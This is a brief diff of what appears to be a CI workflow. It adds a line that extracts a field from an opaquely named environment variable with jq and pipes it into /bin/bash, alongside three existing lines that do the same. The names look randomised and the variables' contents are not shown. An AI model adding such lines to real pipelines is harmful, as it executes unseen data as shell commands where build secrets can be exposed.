@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$hw277" | jq -r .oblr49 | /bin/bash
           printf '%s' "$x5" | jq -r .c753 | /bin/bash
           echo $yt6 | jq -r .a93 | /bin/bash
+          printf '%s' "$cwqud8" | jq -r .o7 | /bin/bash
 
       - name: Upload data
         if: always()
